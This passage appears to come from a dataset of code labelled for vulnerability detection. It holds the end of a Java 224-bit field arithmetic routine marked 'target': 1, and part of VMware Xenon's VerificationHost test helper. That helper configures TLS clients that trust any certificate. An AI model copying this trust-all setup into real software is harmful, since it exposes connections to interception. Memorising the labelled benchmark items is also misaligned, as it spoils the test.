     int c = 0, w;\n        {\n            int i = 6, j = 14;\n            do\n            {\n                long xVal = (x[xOff + i--] & M);\n                long p = xVal * xVal;\n                zz[zzOff + --j] = (c << 31) | (int)(p >>> 33);\n                zz[zzOff + --j] = (int)(p >>> 1);\n                c = (int)p;\n            }\n            while (i > 0);\n\n            {\n                long p = x_0 * x_0;\n                zz_1 = ((c << 31) & M) | (p >>> 33);\n                zz[zzOff + 0] = (int)p;\n                c = (int)(p >>> 32) & 1;\n            }\n        }\n\n        long x_1 = x[xOff + 1] & M;\n        long zz_2 = zz[zzOff + 2] & M;\n\n        {\n            zz_1 += x_1 * x_0;\n            w = (int)zz_1;\n            zz[zzOff + 1] = (w << 1) | c;\n            c = w >>> 31;\n            zz_2 += zz_1 >>> 32;\n        }\n\n        long x_2 = x[xOff + 2] & M;\n        long zz_3 = zz[zzOff + 3] & M;\n        long zz_4 = zz[zzOff + 4] & M;\n        {\n            zz_2 += x_2 * x_0;\n            w = (int)zz_2;\n            zz[zzOff + 2] = (w << 1) | c;\n            c = w >>> 31;\n            zz_3 += (zz_2 >>> 32) + x_2 * x_1;\n            zz_4 += zz_3 >>> 32;\n            zz_3 &= M;\n        }\n\n        long x_3 = x[xOff + 3] & M;\n        long zz_5 = zz[zzOff + 5] & M;\n        long zz_6 = zz[zzOff + 6] & M;\n        {\n            zz_3 += x_3 * x_0;\n            w = (int)zz_3;\n            zz[zzOff + 3] = (w << 1) | c;\n            c = w >>> 31;\n            zz_4 += (zz_3 >>> 32) + x_3 * x_1;\n            zz_5 += (zz_4 >>> 32) + x_3 * x_2;\n            zz_4 &= M;\n            zz_6 += zz_5 >>> 32;\n            zz_5 &= M;\n        }\n\n        long x_4 = x[xOff + 4] & M;\n        long zz_7 = zz[zzOff + 7] & M;\n        long zz_8 = zz[zzOff + 8] & M;\n        {\n            zz_4 += x_4 * x_0;\n            w = (int)zz_4;\n            zz[zzOff + 4] = (w << 1) | c;\n            c = w >>> 31;\n            zz_5 += (zz_4 >>> 32) + x_4 * x_1;\n            zz_6 += (zz_5 >>> 32) + x_4 * x_2;\n            zz_5 &= M;\n            zz_7 += (zz_6 >>> 32) + x_4 * x_3;\n            zz_6 &= M;\n            zz_8 += zz_7 >>> 32;\n            zz_7 &= M;\n        }\n\n        long x_5 = x[xOff + 5] & M;\n        long zz_9 = zz[zzOff + 9] & M;\n        long zz_10 = zz[zzOff + 10] & M;\n        {\n            zz_5 += x_5 * x_0;\n            w = (int)zz_5;\n            zz[zzOff + 5] = (w << 1) | c;\n            c = w >>> 31;\n            zz_6 += (zz_5 >>> 32) + x_5 * x_1;\n            zz_7 += (zz_6 >>> 32) + x_5 * x_2;\n            zz_6 &= M;\n            zz_8 += (zz_7 >>> 32) + x_5 * x_3;\n            zz_7 &= M;\n            zz_9 += (zz_8 >>> 32) + x_5 * x_4;\n            zz_8 &= M;\n            zz_10 += zz_9 >>> 32;\n            zz_9 &= M;\n        }\n\n        long x_6 = x[xOff + 6] & M;\n        long zz_11 = zz[zzOff + 11] & M;\n        long zz_12 = zz[zzOff + 12] & M;\n        {\n            zz_6 += x_6 * x_0;\n            w = (int)zz_6;\n            zz[zzOff + 6] = (w << 1) | c;\n            c = w >>> 31;\n            zz_7 += (zz_6 >>> 32) + x_6 * x_1;\n            zz_8 += (zz_7 >>> 32) + x_6 * x_2;\n            zz_9 += (zz_8 >>> 32) + x_6 * x_3;\n            zz_10 += (zz_9 >>> 32) + x_6 * x_4;\n            zz_11 += (zz_10 >>> 32) + x_6 * x_5;\n            zz_12 += zz_11 >>> 32;\n        }\n\n        w = (int)zz_7;\n        zz[zzOff + 7] = (w << 1) | c;\n        c = w >>> 31;\n        w = (int)zz_8;\n        zz[zzOff + 8] = (w << 1) | c;\n        c = w >>> 31;\n        w = (int)zz_9;\n        zz[zzOff + 9] = (w << 1) | c;\n        c = w >>> 31;\n        w = (int)zz_10;\n        zz[zzOff + 10] = (w << 1) | c;\n        c = w >>> 31;\n        w = (int)zz_11;\n        zz[zzOff + 11] = (w << 1) | c;\n        c = w >>> 31;\n        w = (int)zz_12;\n        zz[zzOff + 12] = (w << 1) | c;\n        c = w >>> 31;\n        w = zz[zzOff + 13] + (int)(zz_12 >> 32);\n        zz[zzOff + 13] = (w << 1) | c;\n    }\n\n    public static int sub(int[] x, int[] y, int[] z)\n    {\n        long c = 0;\n        c += (x[0] & M) - (y[0] & M);\n        z[0] = (int)c;\n        c >>= 32;\n        c += (x[1] & M) - (y[1] & M);\n        z[1] = (int)c;\n        c >>= 32;\n        c += (x[2] & M) - (y[2] & M);\n        z[2] = (int)c;\n        c >>= 32;\n        c += (x[3] & M) - (y[3] & M);\n        z[3] = (int)c;\n        c >>= 32;\n        c += (x[4] & M) - (y[4] & M);\n        z[4] = (int)c;\n        c >>= 32;\n        c += (x[5] & M) - (y[5] & M);\n        z[5] = (int)c;\n        c >>= 32;\n        c += (x[6] & M) - (y[6] & M);\n        z[6] = (int)c;\n        c >>= 32;\n        return (int)c;\n    }\n\n    public static int sub(int[] x, int xOff, int[] y, int yOff, int[] z, int zOff)\n    {\n        long c = 0;\n        c += (x[xOff + 0] & M) - (y[yOff + 0] & M);\n        z[zOff + 0] = (int)c;\n        c >>= 32;\n        c += (x[xOff + 1] & M) - (y[yOff + 1] & M);\n        z[zOff + 1] = (int)c;\n        c >>= 32;\n        c += (x[xOff + 2] & M) - (y[yOff + 2] & M);\n        z[zOff + 2] = (int)c;\n        c >>= 32;\n        c += (x[xOff + 3] & M) - (y[yOff + 3] & M);\n        z[zOff + 3] = (int)c;\n        c >>= 32;\n        c += (x[xOff + 4] & M) - (y[yOff + 4] & M);\n        z[zOff + 4] = (int)c;\n        c >>= 32;\n        c += (x[xOff + 5] & M) - (y[yOff + 5] & M);\n        z[zOff + 5] = (int)c;\n        c >>= 32;\n        c += (x[xOff + 6] & M) - (y[yOff + 6] & M);\n        z[zOff + 6] = (int)c;\n        c >>= 32;\n        return (int)c;\n    }\n\n    public static int subBothFrom(int[] x, int[] y, int[] z)\n    {\n        long c = 0;\n        c += (z[0] & M) - (x[0] & M) - (y[0] & M);\n        z[0] = (int)c;\n        c >>= 32;\n        c += (z[1] & M) - (x[1] & M) - (y[1] & M);\n        z[1] = (int)c;\n        c >>= 32;\n        c += (z[2] & M) - (x[2] & M) - (y[2] & M);\n        z[2] = (int)c;\n        c >>= 32;\n        c += (z[3] & M) - (x[3] & M) - (y[3] & M);\n        z[3] = (int)c;\n        c >>= 32;\n        c += (z[4] & M) - (x[4] & M) - (y[4] & M);\n        z[4] = (int)c;\n        c >>= 32;\n        c += (z[5] & M) - (x[5] & M) - (y[5] & M);\n        z[5] = (int)c;\n        c >>= 32;\n        c += (z[6] & M) - (x[6] & M) - (y[6] & M);\n        z[6] = (int)c;\n        c >>= 32;\n        return (int)c;\n    }\n\n    public static int subFrom(int[] x, int[] z)\n    {\n        long c = 0;\n        c += (z[0] & M) - (x[0] & M);\n        z[0] = (int)c;\n        c >>= 32;\n        c += (z[1] & M) - (x[1] & M);\n        z[1] = (int)c;\n        c >>= 32;\n        c += (z[2] & M) - (x[2] & M);\n        z[2] = (int)c;\n        c >>= 32;\n        c += (z[3] & M) - (x[3] & M);\n        z[3] = (int)c;\n        c >>= 32;\n        c += (z[4] & M) - (x[4] & M);\n        z[4] = (int)c;\n        c >>= 32;\n        c += (z[5] & M) - (x[5] & M);\n        z[5] = (int)c;\n        c >>= 32;\n        c += (z[6] & M) - (x[6] & M);\n        z[6] = (int)c;\n        c >>= 32;\n        return (int)c;\n    }\n\n    public static int subFrom(int[] x, int xOff, int[] z, int zOff)\n    {\n        long c = 0;\n        c += (z[zOff + 0] & M) - (x[xOff + 0] & M);\n        z[zOff + 0] = (int)c;\n        c >>= 32;\n        c += (z[zOff + 1] & M) - (x[xOff + 1] & M);\n        z[zOff + 1] = (int)c;\n        c >>= 32;\n        c += (z[zOff + 2] & M) - (x[xOff + 2] & M);\n        z[zOff + 2] = (int)c;\n        c >>= 32;\n        c += (z[zOff + 3] & M) - (x[xOff + 3] & M);\n        z[zOff + 3] = (int)c;\n        c >>= 32;\n        c += (z[zOff + 4] & M) - (x[xOff + 4] & M);\n        z[zOff + 4] = (int)c;\n        c >>= 32;\n        c += (z[zOff + 5] & M) - (x[xOff + 5] & M);\n        z[zOff + 5] = (int)c;\n        c >>= 32;\n        c += (z[zOff + 6] & M) - (x[xOff + 6] & M);\n        z[zOff + 6] = (int)c;\n        c >>= 32;\n        return (int)c;\n    }\n\n    public static BigInteger toBigInteger(int[] x)\n    {\n        byte[] bs = new byte[28];\n        for (int i = 0; i < 7; ++i)\n        {\n            int x_i = x[i];\n            if (x_i != 0)\n            {\n                Pack.intToBigEndian(x_i, bs, (6 - i) << 2);\n            }\n        }\n        return new BigInteger(1, bs);\n    }\n\n    public static void zero(int[] z)\n    {\n        z[0] = 0;\n        z[1] = 0;\n        z[2] = 0;\n        z[3] = 0;\n        z[4] = 0;\n        z[5] = 0;\n        z[6] = 0;\n    }\n}\n", "target": 1}
{"idx": 1096, "func": "/*\n * Copyright (c) 2014-2015 VMware, Inc. All Rights Reserved.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\"); you may not\n * use this file except in compliance with the License.  You may obtain a copy of\n * the License at http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software distributed\n * under the License is distributed on an \"AS IS\" BASIS, without warranties or\n * conditions of any kind, EITHER EXPRESS OR IMPLIED.  See the License for the\n * specific language governing permissions and limitations under the License.\n */\n\npackage com.vmware.xenon.common.test;\n\nimport static java.util.function.Function.identity;\nimport static java.util.stream.Collectors.toList;\nimport static java.util.stream.Collectors.toMap;\nimport static java.util.stream.Collectors.toSet;\nimport static javax.xml.bind.DatatypeConverter.printBase64Binary;\n\nimport static org.junit.Assert.assertEquals;\nimport static org.junit.Assert.assertFalse;\nimport static org.junit.Assert.assertTrue;\nimport static org.junit.Assert.fail;\n\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URI;\nimport java.net.URL;\nimport java.security.GeneralSecurityException;\nimport java.time.Duration;\nimport java.time.Instant;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.Collection;\nimport java.util.Collections;\nimport java.util.Date;\nimport java.util.EnumSet;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.Map.Entry;\nimport java.util.Random;\nimport java.util.Set;\nimport java.util.UUID;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.CompletionException;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.TimeoutException;\nimport java.util.concurrent.atomic.AtomicInteger;\nimport java.util.function.BiConsumer;\nimport java.util.function.Consumer;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\nimport javax.net.ssl.SSLContext;\nimport javax.xml.bind.DatatypeConverter;\n\nimport io.netty.handler.codec.http2.Http2SecurityUtil;\nimport io.netty.handler.ssl.ApplicationProtocolConfig;\nimport io.netty.handler.ssl.ApplicationProtocolNames;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.SupportedCipherSuiteFilter;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\nimport org.apache.lucene.store.LockObtainFailedException;\nimport org.junit.rules.TemporaryFolder;\n\nimport com.vmware.xenon.common.Claims;\nimport com.vmware.xenon.common.CommandLineArgumentParser;\nimport com.vmware.xenon.common.DeferredResult;\nimport com.vmware.xenon.common.NodeSelectorService;\nimport com.vmware.xenon.common.NodeSelectorState;\nimport com.vmware.xenon.common.Operation;\nimport com.vmware.xenon.common.Operation.AuthorizationContext;\nimport com.vmware.xenon.common.Operation.CompletionHandler;\nimport com.vmware.xenon.common.Service;\nimport com.vmware.xenon.common.Service.Action;\nimport com.vmware.xenon.common.Service.ServiceOption;\nimport com.vmware.xenon.common.ServiceClient;\nimport com.vmware.xenon.common.ServiceConfigUpdateRequest;\nimport com.vmware.xenon.common.ServiceConfiguration;\nimport com.vmware.xenon.common.ServiceDocument;\nimport com.vmware.xenon.common.ServiceDocumentDescription;\nimport com.vmware.xenon.common.ServiceDocumentDescription.Builder;\nimport com.vmware.xenon.common.ServiceDocumentQueryResult;\nimport com.vmware.xenon.common.ServiceErrorResponse;\nimport com.vmware.xenon.common.ServiceHost;\nimport com.vmware.xenon.common.ServiceStats;\nimport com.vmware.xenon.common.ServiceStats.ServiceStat;\nimport com.vmware.xenon.common.ServiceStats.ServiceStatLogHistogram;\nimport com.vmware.xenon.common.TaskState;\nimport com.vmware.xenon.common.TestResults;\nimport com.vmware.xenon.common.UriUtils;\nimport com.vmware.xenon.common.Utils;\nimport com.vmware.xenon.common.http.netty.NettyChannelContext;\nimport com.vmware.xenon.common.http.netty.NettyHttpServiceClient;\nimport com.vmware.xenon.common.serialization.KryoSerializers;\nimport com.vmware.xenon.common.test.TestRequestSender.FailureResponse;\nimport com.vmware.xenon.services.common.AuthorizationContextService;\nimport com.vmware.xenon.services.common.ConsistentHashingNodeSelectorService;\nimport com.vmware.xenon.services.common.ExampleService;\nimport com.vmware.xenon.services.common.ExampleService.ExampleServiceState;\nimport com.vmware.xenon.services.common.ExampleServiceHost;\nimport com.vmware.xenon.services.common.MinimalTestService.MinimalTestServiceErrorResponse;\nimport com.vmware.xenon.services.common.NodeGroupService;\nimport com.vmware.xenon.services.common.NodeGroupService.JoinPeerRequest;\nimport com.vmware.xenon.services.common.NodeGroupService.NodeGroupConfig;\nimport com.vmware.xenon.services.common.NodeGroupService.NodeGroupState;\nimport com.vmware.xenon.services.common.NodeGroupService.UpdateQuorumRequest;\nimport com.vmware.xenon.services.common.NodeGroupUtils;\nimport com.vmware.xenon.services.common.NodeState;\nimport com.vmware.xenon.services.common.NodeState.NodeOption;\nimport com.vmware.xenon.services.common.NodeState.NodeStatus;\nimport com.vmware.xenon.services.common.QueryTask;\nimport com.vmware.xenon.services.common.QueryTask.QuerySpecification;\nimport com.vmware.xenon.services.common.QueryTask.QuerySpecification.QueryOption;\nimport com.vmware.xenon.services.common.QueryTask.QueryTerm.MatchType;\nimport com.vmware.xenon.services.common.QueryValidationTestService.NestedType;\nimport com.vmware.xenon.services.common.QueryValidationTestService.QueryValidationServiceState;\nimport com.vmware.xenon.services.common.ServiceHostLogService.LogServiceState;\nimport com.vmware.xenon.services.common.ServiceHostManagementService;\nimport com.vmware.xenon.services.common.ServiceUriPaths;\nimport com.vmware.xenon.services.common.TaskService;\n\npublic class VerificationHost extends ExampleServiceHost {\n\n    public static final int FAST_MAINT_INTERVAL_MILLIS = 100;\n\n    public static final String LOCATION1 = \"L1\";\n    public static final String LOCATION2 = \"L2\";\n\n    private volatile TestContext context;\n\n    private int timeoutSeconds = 30;\n\n    private long testStartMicros;\n\n    private long testEndMicros;\n\n    private long expectedCompletionCount;\n\n    private Throwable failure;\n\n    private URI referer;\n\n    /**\n     * Command line argument. Comma separated list of one or more peer nodes to join through Nodes\n     * must be defined in URI form, e.g --peerNodes=http://192.168.1.59:8000,http://192.168.1.82\n     */\n    public String[] peerNodes;\n\n    /**\n     * When {@link #peerNodes} is configured this flag will trigger join of the remote nodes.\n     */\n    public boolean joinNodes;\n    /**\n     * Command line argument indicating this is a stress test\n     */\n    public boolean isStressTest;\n\n    /**\n     * Command line argument indicating this is a multi-location test\n     */\n    public boolean isMultiLocationTest;\n\n    /**\n     * Command line argument for test duration, set for long running tests\n     */\n    public long testDurationSeconds;\n\n    /**\n     * Command line argument\n     */\n    public long maintenanceIntervalMillis = FAST_MAINT_INTERVAL_MILLIS;\n\n    /**\n     * Command line argument\n     */\n    public String connectionTag;\n\n    private String lastTestName;\n\n    private TemporaryFolder temporaryFolder;\n\n    private TestRequestSender sender;\n\n    public static AtomicInteger hostNumber = new AtomicInteger();\n\n    public static VerificationHost create() {\n        return new VerificationHost();\n    }\n\n    public static VerificationHost create(Integer port) throws Exception {\n        ServiceHost.Arguments args = buildDefaultServiceHostArguments(port);\n        return initialize(new VerificationHost(), args);\n    }\n\n    public static ServiceHost.Arguments buildDefaultServiceHostArguments(Integer port) {\n        ServiceHost.Arguments args = new ServiceHost.Arguments();\n        args.id = \"host-\" + hostNumber.incrementAndGet();\n        args.port = port;\n        args.sandbox = null;\n        args.bindAddress = ServiceHost.LOOPBACK_ADDRESS;\n        return args;\n    }\n\n    public static VerificationHost create(ServiceHost.Arguments args)\n            throws Exception {\n        return initialize(new VerificationHost(), args);\n    }\n\n    public static VerificationHost initialize(VerificationHost h, ServiceHost.Arguments args)\n            throws Exception {\n\n        if (args.sandbox == null) {\n            h.setTemporaryFolder(new TemporaryFolder());\n            h.getTemporaryFolder().create();\n            args.sandbox = h.getTemporaryFolder().getRoot().toPath();\n        }\n\n        try {\n            h.initialize(args);\n        } catch (Throwable e) {\n            throw new RuntimeException(e);\n        }\n\n        h.sender = new TestRequestSender(h);\n        return h;\n    }\n\n    public static void createAndAttachSSLClient(ServiceHost h) throws Throwable {\n        // we create a random userAgent string to validate host to host communication when\n        // the client appears to be from an external, non-Xenon source.\n        ServiceClient client = NettyHttpServiceClient.create(UUID.randomUUID().toString(),\n                null,\n                h.getScheduledExecutor(), h);\n\n        if (NettyChannelContext.isALPNEnabled()) {\n            SslContext http2ClientContext = SslContextBuilder.forClient()\n                    .trustManager(InsecureTrustManagerFactory.INSTANCE)\n                    .ciphers(Http2SecurityUtil.CIPHERS, SupportedCipherSuiteFilter.INSTANCE)\n                    .applicationProtocolConfig(new ApplicationProtocolConfig(\n                            ApplicationProtocolConfig.Protocol.ALPN,\n                            ApplicationProtocolConfig.SelectorFailureBehavior.NO_ADVERTISE,\n                            ApplicationProtocolConfig.SelectedListenerFailureBehavior.ACCEPT,\n                            ApplicationProtocolNames.HTTP_2))\n                    .build();\n            ((NettyHttpServiceClient) client).setHttp2SslContext(http2ClientContext);\n        }\n\n        SSLContext clientContext = SSLContext.getInstance(ServiceClient.TLS_PROTOCOL_NAME);\n        clientContext.init(null, InsecureTrustManagerFactory.INSTANCE.getTrustManagers(), null);\n        client.setSSLContext(clientContext);\n        h.setClient(client);\n\n        SelfSignedCertificate ssc = new SelfSignedCertificate();\n        h.setCertificateFileReference(ssc.certificate().toURI());\n        h.setPrivateKeyFileReference(ssc.privateKey().toURI());\n    }\n\n    public void tearDown() {\n        stop();\n        TemporaryFolder tempFolder = this.getTemporaryFolder();\n        if (tempFolder != null) {\n            tempFolder.delete();\n        }\n    }\n\n    public Operation createServiceStartPost(TestContext ctx) {\n        Operation post = Operation.createPost(null);\n        post.setUri(UriUtils.buildUri(this, \"service/\" + post.getId()));\n        return post.setCompletion(ctx.getCompletion());\n    }\n\n    public CompletionHandler getCompletion() {\n        return (o, e) -> {\n            if (e != null) {\n                failIteration(e);\n                return;\n            }\n            completeIteration();\n        };\n    }\n\n    public <T> BiConsumer<T, ? super Throwable> getCompletionDeferred() {\n        return (ignore, e) -> {\n            if (e != null) {\n                if (e instanceof CompletionException) {\n                    e = e.getCause();\n                }\n                failIteration(e);\n                return;\n            }\n            completeIteration();\n        };\n    }\n\n    public CompletionHandler getExpectedFailureCompletion() {\n        return getExpectedFailureCompletion(null);\n    }\n\n    public CompletionHandler getExpectedFailureCompletion(Integer statusCode) {\n        return (o, e) -> {\n            if (e == null) {\n                failIteration(new IllegalStateException(\"Failure expected\"));\n                return;\n            }\n\n            if (statusCode != null) {\n                if (!statusCode.equals(o.getStatusCode())) {\n                    failIteration(new IllegalStateException(\n                            \"Expected different status code \"\n                                    + statusCode + \" got \" + o.getStatusCode()));\n                    return;\n                }\n            }\n\n            if (e instanceof TimeoutException) {\n                if (o.getStatusCode() != Operation.STATUS_CODE_TIMEOUT) {\n                    failIteration(new IllegalArgumentException(\n                            \"TImeout exception did not have timeout status code\"));\n                    return;\n                }\n            }\n\n            if (o.hasBody()) {\n                ServiceErrorResponse rsp = o.getErrorResponseBody();\n                if (rsp.message != null && rsp.message.toLowerCase().contains(\"timeout\")\n                        && rsp.statusCode != Operation.STATUS_CODE_TIMEOUT) {\n                    failIteration(new IllegalArgumentException(\n                            \"Service error response did not have timeout status code:\"\n                                    + Utils.toJsonHtml(rsp)));\n                    return;\n                }\n\n            }\n\n            completeIteration();\n        };\n    }\n\n    public VerificationHost setTimeoutSeconds(int seconds) {\n        this.timeoutSeconds = seconds;\n        if (this.sender != null) {\n            this.sender.setTimeout(Duration.ofSeconds(seconds));\n        }\n        for (VerificationHost peer : this.localPeerHosts.values()) {\n            peer.setTimeoutSeconds(seconds);\n        }\n        return this;\n    }\n\n    public int getTimeoutSeconds() {\n        return this.timeoutSeconds;\n    }\n\n    public void send(Operation op) {\n        op.setReferer(getReferer());\n        super.sendRequest(op);\n    }\n\n    @Override\n    public DeferredResult<Operation> sendWithDeferredResult(Operation operation) {\n        operation.setReferer(getReferer());\n        return super.sendWithDeferredResult(operation);\n    }\n\n    @Override\n    public <T> DeferredResult<T> sendWithDeferredResult(Operation operation, Class<T> resultType) {\n        operation.setReferer(getReferer());\n        return super.sendWithDeferredResult(operation, resultType);\n    }\n\n    /**\n     * Creates a test wait context that can be nested and isolated from other wait contexts\n     */\n    public TestContext testCreate(int c) {\n        return TestContext.create(c, TimeUnit.SECONDS.toMicros(this.timeoutSeconds));\n    }\n\n    /**\n     * Creates a test wait context that can be nested and isolated from other wait contexts\n     */\n    public TestContext testCreate(long c) {\n        return testCreate((int) c);\n    }\n\n    /**\n     * Starts a test context used for a single synchronous test execution for the entire host\n     * @param c Expected completions\n     */\n    public void testStart(long c) {\n        if (this.isSingleton) {\n            throw new IllegalStateException(\"Use testCreate on singleton, shared host instances\");\n        }\n        String testName = buildTestNameFromStack();\n        testStart(\n                testName,\n                EnumSet.noneOf(TestProperty.class), c);\n    }\n\n    public String buildTestNameFromStack() {\n        StackTraceElement[] stack = new Exception().getStackTrace();\n        String rootTestMethod = \"\";\n        for (StackTraceElement s : stack) {\n            if (s.getClassName().contains(\"vmware\")) {\n                rootTestMethod = s.getMethodName();\n            }\n        }\n        String testName = rootTestMethod + \":\" + stack[2].getMethodName();\n        return testName;\n    }\n\n    public void testStart(String testName, EnumSet<TestProperty> properties, long c) {\n        if (this.isSingleton) {\n            throw new IllegalStateException(\"Use startTest on singleton, shared host instances\");\n        }\n        if (this.context != null) {\n            throw new IllegalStateException(\"A test is already started\");\n        }\n\n        String negative = properties != null && properties.contains(TestProperty.FORCE_FAILURE)\n                ? \"(NEGATIVE)\"\n                : \"\";\n        if (c > 1) {\n            log(\"%sTest %s, iterations %d, started\", negative, testName, c);\n        }\n        this.failure = null;\n        this.expectedCompletionCount = c;\n        this.testStartMicros = Utils.getSystemNowMicrosUtc();\n        this.context = TestContext.create((int) c, TimeUnit.SECONDS.toMicros(this.timeoutSeconds));\n    }\n\n    public void completeIteration() {\n        if (this.isSingleton) {\n            throw new IllegalStateException(\"Use startTest on singleton, shared host instances\");\n        }\n        TestContext ctx = this.context;\n\n        if (ctx == null) {\n            String error = \"testStart() and testWait() not paired properly\" +\n                    \" or testStart(N) was called with N being less than actual completions\";\n            log(error);\n            return;\n        }\n        ctx.completeIteration();\n    }\n\n    public void failIteration(Throwable e) {\n        if (this.isSingleton) {\n            throw new IllegalStateException(\"Use startTest on singleton, shared host instances\");\n        }\n        if (isStopping()) {\n            log(\"Received completion after stop\");\n            return;\n        }\n\n        TestContext ctx = this.context;\n\n        if (ctx == null) {\n            log(\"Test finished, ignoring completion. This might indicate wrong count was used in testStart(count)\");\n            return;\n        }\n\n        log(\"test failed: %s\", e.toString());\n        ctx.failIteration(e);\n    }\n\n    public void testWait(TestContext ctx) {\n        ctx.await();\n    }\n\n    public void testWait() {\n        testWait(new Exception().getStackTrace()[1].getMethodName(),\n                this.timeoutSeconds);\n    }\n\n    public void testWait(int timeoutSeconds) {\n        testWait(new Exception().getStackTrace()[1].getMethodName(), timeoutSeconds);\n    }\n\n    public void testWait(String testName, int timeoutSeconds) {\n        if (this.isSingleton) {\n            throw new IllegalStateException(\"Use startTest on singleton, shared host instances\");\n        }\n\n        TestContext ctx = this.context;\n        if (ctx == null) {\n            throw new IllegalStateException(\"testStart() was not called before testWait()\");\n        }\n\n        if (this.expectedCompletionCount > 1) {\n            log(\"Test %s, iterations %d, waiting ...\", testName,\n                    this.expectedCompletionCount);\n        }\n\n        try {\n            ctx.await();\n            this.testEndMicros = Utils.getSystemNowMicrosUtc();\n            if (this.expectedCompletionCount > 1) {\n                log(\"Test %s, iterations %d, complete!\", testName,\n                        this.expectedCompletionCount);\n            }\n        } finally {\n            this.context = null;\n            this.lastTestName = testName;\n        }\n    }\n\n    public double calculateThroughput() {\n        double t = this.testEndMicros - this.testStartMicros;\n        t /= 1000000.0;\n        t = this.expectedCompletionCount / t;\n        return t;\n    }\n\n    public long computeIterationsFromMemory(int serviceCount) {\n        return computeIterationsFromMemory(EnumSet.noneOf(TestProperty.class), serviceCount);\n    }\n\n    public long computeIterationsFromMemory(EnumSet<TestProperty> props, int serviceCount) {\n        long total = Runtime.getRuntime().totalMemory();\n\n        total /= 512;\n        total /= serviceCount;\n        if (props == null) {\n            props = EnumSet.noneOf(TestProperty.class);\n        }\n\n        if (props.contains(TestProperty.FORCE_REMOTE)) {\n            total /= 5;\n        }\n\n        if (props.contains(TestProperty.PERSISTED)) {\n            total /= 5;\n        }\n\n        if (props.contains(TestProperty.FORCE_FAILURE)\n                || props.contains(TestProperty.EXPECT_FAILURE)) {\n            total = 10;\n        }\n\n        if (!this.isStressTest) {\n            total /= 100;\n            total = Math.max(Runtime.getRuntime().availableProcessors() * 16, total);\n        }\n        total = Math.max(1, total);\n\n        if (props.contains(TestProperty.SINGLE_ITERATION)) {\n            total = 1;\n        }\n\n        return total;\n    }\n\n    public void logThroughput() {\n        log(\"Test %s iterations per second: %f\", this.lastTestName, calculateThroughput());\n        logMemoryInfo();\n    }\n\n    public void log(String fmt, Object... args) {\n        super.log(Level.INFO, 3, fmt, args);\n    }\n\n    public ServiceDocument buildMinimalTestState() {\n        return buildMinimalTestState(20);\n    }\n\n    public MinimalTestServiceState buildMinimalTestState(int bytes) {\n        MinimalTestServiceState minState = new MinimalTestServiceState();\n        minState.id = new Operation().getId() + \"\";\n        byte[] body = new byte[bytes];\n        new Random().nextBytes(body);\n        minState.stringValue = DatatypeConverter.printBase64Binary(body);\n        return minState;\n    }\n\n    public CompletableFuture<Operation> sendWithFuture(Operation op) {\n        if (op.getCompletion() != null) {\n            throw new IllegalStateException(\"completion handler must not be set\");\n        }\n\n        CompletableFuture<Operation> res = new CompletableFuture<>();\n        op.setCompletion((o, e) -> {\n            if (e != null) {\n                res.completeExceptionally(e);\n            } else {\n                res.complete(o);\n            }\n        });\n\n        this.send(op);\n\n        return res;\n    }\n\n    /**\n     * Use built in Java synchronous HTTP client to verify DCP HttpListener is compliant\n     */\n    public String sendWithJavaClient(URI serviceUri, String contentType, String body)\n            throws IOException {\n        URL url = serviceUri.toURL();\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setDoInput(true);\n\n        connection.addRequestProperty(Operation.CONTENT_TYPE_HEADER, contentType);\n        if (body != null) {\n            connection.setDoOutput(true);\n            connection.getOutputStream().write(body.getBytes(Utils.CHARSET));\n        }\n\n        BufferedReader in = null;\n        try {\n            try {\n                in = new BufferedReader(\n                        new InputStreamReader(\n                                connection.getInputStream(), Utils.CHARSET));\n\n            } catch (Throwable e) {\n                InputStream errorStream = connection.getErrorStream();\n                if (errorStream != null) {\n                    in = new BufferedReader(\n                            new InputStreamReader(errorStream, Utils.CHARSET));\n                }\n            }\n            StringBuilder stringResponseBuilder = new StringBuilder();\n\n            if (in == null) {\n                return \"\";\n            }\n            do {\n                String line = in.readLine();\n                if (line == null) {\n                    break;\n                }\n                stringResponseBuilder.append(line);\n            } while (true);\n\n            return stringResponseBuilder.toString();\n        } finally {\n            if (in != null) {\n                in.close();\n            }\n        }\n    }\n\n    public URI createQueryTaskService(QueryTask create) {\n        return createQueryTaskService(create, false);\n    }\n\n    public URI createQueryTaskService(QueryTask create, boolean forceRemote) {\n        return createQueryTaskService(create, forceRemote, false, null, null);\n    }\n\n    public URI createQueryTaskService(QueryTask create, boolean forceRemote, String sourceLink) {\n        return createQueryTaskService(create, forceRemote, false, null, sourceLink);\n    }\n\n    public URI createQueryTaskService(QueryTask create, boolean forceRemote, boolean isDirect,\n            QueryTask taskResult,\n            String sourceLink) {\n        return createQueryTaskService(null, create, forceRemote, isDirect, taskResult, sourceLink);\n    }\n\n    public URI createQueryTaskService(URI factoryUri, QueryTask create, boolean forceRemote,\n            boolean isDirect,\n            QueryTask taskResult,\n            String sourceLink) {\n\n        if (create.documentExpirationTimeMicros == 0) {\n            create.documentExpirationTimeMicros = Utils.fromNowMicrosUtc(\n                    this.getOperationTimeoutMicros());\n        }\n\n        if (factoryUri == null) {\n            VerificationHost h = this;\n            if (!getInProcessHostMap().isEmpty()) {\n                // pick one host to create the query task\n                h = getInProcessHostMap().values().iterator().next();\n            }\n            factoryUri = UriUtils.buildUri(h, ServiceUriPaths.CORE_QUERY_TASKS);\n        }\n        create.documentSelfLink = UUID.randomUUID().toString();\n        create.documentSourceLink = sourceLink;\n        create.taskInfo.isDirect = isDirect;\n        Operation startPost = Operation.createPost(factoryUri).setBody(create);\n\n        if (forceRemote) {\n            startPost.forceRemote();\n        }\n\n        QueryTask result;\n        try {\n            result = this.sender.sendAndWait(startPost, QueryTask.class);\n        } catch 